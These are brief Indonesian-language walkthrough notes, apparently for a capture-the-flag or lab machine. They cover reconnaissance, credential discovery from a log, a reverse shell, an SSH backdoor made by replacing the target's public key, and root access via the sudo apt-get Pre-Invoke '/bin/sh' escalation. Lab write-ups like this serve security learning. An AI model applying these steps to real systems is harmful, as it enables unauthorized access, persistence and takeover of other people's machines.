# boot:
1. scan nmap 22 80 kebuka -> fuzz ada mail yg isinya ada pcap juga -> wget aja analyze di wireshark
2. ada log login ada creds buatt login juga sama ada host tempat loginnya subdo nya
3. login aja bisa execute command -> revshell di command itu -> cari2 ada ssh public key di /opt backup
4. gada priv key tapi jadi pub key nya gatau buat apa 
5. backdooring ssh -> sudo ssh-keygen -t rsa -b 4096 -> nanti tulis aja jake 
6. dah jadi -> gantiin ssh pubb yg di target -> echo "pub mu yg dari gen" > target.pub
7. sudo ssh -i namatadi nama@ip -> dah jadi 

# PE :
1. sudo -l -> cari gtfobins yang apt-get 
2. ada sudo ygg ini run aja -> apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
3. klaim root
